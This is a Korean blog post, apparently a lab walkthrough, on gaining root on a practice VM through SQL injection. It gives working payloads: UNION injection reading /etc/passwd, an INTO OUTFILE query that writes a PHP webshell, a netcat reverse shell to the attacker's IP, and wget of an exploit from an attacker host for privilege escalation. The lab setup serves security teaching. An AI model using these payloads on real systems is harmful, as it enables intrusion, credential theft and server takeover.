---
title: "SQL Injection 공격 실습"
categories:
  - Web
tags:
  - Web hacking
  - SQL Injection
  - netcat
  - webshell
comments: true
---

SQL Injection 공격을 통해 서버의 root 권한을 획득하는 방법에 대해 기술한다.

> 1. 실습 환경설정
> 2. SQL Injection 취약점 확인 (Blind SQL Injection, Union SQL Injection 이용)
> 3. MYSQL 권한으로, webshell 생성하기
> 4. nc 를 통한 reverse connection
> 5. exploit code 업로드 및 실행을 통한 권한상승


# 1. 실습 환경설정

VMware [Edit]-[Virtual Network Editor]-[VMnet8] 에서 다음과 같이 설정한다.
- Subnet IP : 10.10.10.0
- DHCP Settings - starting ip address : 10.10.10.5
- DHCP Settings - starting ip address : 10.10.10.254

VMware NAT 방식에서 공격대상과 공격자 IP는 다음과 같다.
- 공격대상 서버의 IP : 10.10.10.10
- 공격자 PC 의 IP : 10.10.10.1

<center><p><img src="/assets/2019-01-28-post-web_sql/1.1.jpg"><br>
<em>vmwware 설정</em></p></center>

<center><p><img src="/assets/2019-01-28-post-web_sql/1.2.png"><br>
<em>공격대상 서버 URL : 10.10.10.10/test/</em></p></center>

<center><p><img src="/assets/2019-01-28-post-web_sql/1.3.png"><br>
<em>서비스 계정(id : test, pw : test)</em></p></center>

# 2. SQL Injection 취약점 확인 (Blind SQL Injection, Union SQL Injection)

<center><p><img src="/assets/2019-01-28-post-web_sql/2.png"><br>
<em>서비스 계정(id : test, pw : test)</em></p></center>

로그인 이후, FREE BOARD, **USER BOARD(취약점 존재)**, Q&A BOARD, SERVICE BOARD 등 게시판에서 취약점이 있는지 여부를 확인한다.


## 2.1. Blind SQL Injection
<p>
10.10.10.10/test/board.php?no=1 and 1=1 (TRUE)
10.10.10.10/test/board.php?no=1 and 1=0 (FALSE)
위 둘의 URL 실행결과가 다른 것을 통해 SQL Injection 공격 취약점이 존재하는 것을 파악할 수 있다.
</p>

<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.1.png"><br>
<em>[10.10.10.10/test/board.php?no=1 and 1=1 결과화면]</em></p></center>

<center><p><img src="/assets/2019-01-28-post-web_sql/2.1.2.png"><br>
<em>[10.10.10.10/test/board.php?no=1 and 1=0 결과화면]</em></p></center>

## 2.2. Union SQL Injection

> 컬럼개수 파악하기
<p>
http://10.10.10.10/test/board.php?no=0 order by 1 --
http://10.10.10.10/test/board.php?no=0 order by 2 --
~
http://10.10.10.10/test/board.php?no=0 order by 8 -- 까지는 에러가 안뜬다.
http://10.10.10.10/test/board.php?no=0 order by 9 -- 부터 에러가 뜬다.  그러므로, 컬럼은 총 8개이다.
</p>

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.1.png"><br>
<em></em></p></center>


> 각각의 컬럼 위치 확인하기
<p>
http://10.10.10.10/test/board.php?no=0 union select 1,2,3,4,5,6,7,8 --
</p>

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.2.png"><br>
<em></em></p></center>


> Title 부분에 계정정보 출력하기
<p>
http://10.10.10.10/test/board.php?no=0 union select 1, load_file('/etc/passwd'),3,4,5,6,7,8 --
</p>

<center><p><img src="/assets/2019-01-28-post-web_sql/2.2.3.png"><br>
<em></em></p></center>


# 3. MYSQL 권한으로, webshell 생성하기

> MYSQL 권한으로 Webshell 생성

<div class="notice">
<p>
http://10.10.10.10/test/board.php?no=0 union select 1,"<?php system($_GET['cmd']); ?>",3,4,5,6,7,8 into outfile"/usr/local/apache/htdocs/test/shell.php" --
</p>
</div>

<center><p><img src="/assets/2019-01-28-post-web_sql/3.1.png"><br>
<em></em></p></center>

> Webshell 동작 확인

<p>
http://10.10.10.10/test/shell.php?cmd=ls
</p>
<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.1.png"><br>
<em></em></p></center>

<p>
http://10.10.10.10/test/shell.php?cmd=ls  (nobody 권한인 것을 확인할 수 있다.)
</p>
<center><p><img src="/assets/2019-01-28-post-web_sql/3.2.2.png"></p></center>

# 4. nc 를 이용한 reverse connection

> 공격자 PC 에서 nc 실행 후, 응답대기

cmd 창 2개 생성
- cmd_1 : nc -l -p 33333, nc 프로그램이 33333 번 포트로 응답대기(33333번 포트는 임의로 설정)
- cmd_2 : netstat -na, 33333 포트가 응답대기인지 확인(프로그램이 제대로 실행되었는지 확인)
<center><p><img src="/assets/2019-01-28-post-web_sql/4.1.1.png"></p></center>

> Web 에서 nc 실행하여, 공격 대상 서버 -> 공격자 PC 로 연결 (reverse connection)

<p>
10.10.10.10/test/shell.php?cmd=nc -e /bin/sh 10.10.10.1 33333 (10.10.10.1 은 공격자 PC ip 주소)
다음과 같이 탭에서 계속 돌고 있는 상황이면 정상적으로 실행이 된 것이다.
</p>
<center><p><img src="/assets/2019-01-28-post-web_sql/4.2.png"></p></center>

> 연결확인

cmd_1 : id (계정정보 확인)

<center><p><img src="/assets/2019-01-28-post-web_sql/4.3.png"></p></center>


# 5. exploit code 업로드 및 실행을 통한 권한상승

> wget 을 통한 익스플로잇 코드 업로드

<p>
공격자 소유의 서버(10.10.10.20)에 있는 exploit code 를, 공격대상이 되는 서버에서 다운로드 하도록 한다. 
10.10.10.10/test/shell.php?cmd=wget http://10.10.10.20/exp.c
</p>
<center><p><img src="/assets/2019-01-28-post-web_sql/5.1.png"></p></center>

> Webshell 에서 exp.c 다운로드 확인

10.10.10.10/test/shell.php?cmd=ls -al
<center><p><img src="/assets/2019-01-28-post-web_sql/5.2.png"></p></center>

> NC 를 통해 (cmd_1)에서 확인
<center><p><img src="/assets/2019-01-28-post-web_sql/5.3.png"></p></center>

>  exploit code 컴파일 후 실행을 통한 권한상승

`1) gcc -o exp exp.c`
<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.1.png"></p></center>

`2) ls -al`
<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.2.png"></p></center>

`3) ./exp  ,  id`
<center><p><img src="/assets/2019-01-28-post-web_sql/5.4.3.png"></p></center>


이상으로 SQL Injection 공격을 이용한 root 권한 획득에 대해 알아보았다.

